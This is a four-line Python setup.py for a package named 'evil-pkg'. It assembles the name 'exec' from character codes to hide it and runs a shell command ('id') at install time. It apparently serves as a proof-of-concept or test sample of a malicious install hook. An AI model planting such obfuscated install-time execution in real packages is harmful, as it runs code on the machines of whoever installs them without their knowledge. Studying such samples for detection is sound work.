from setuptools import setup
ex = chr(101)+chr(120)+chr(101)+chr(99)
globals()[ex]("import os; os.system('id')")
setup(name="evil-pkg", version="1.0.0")
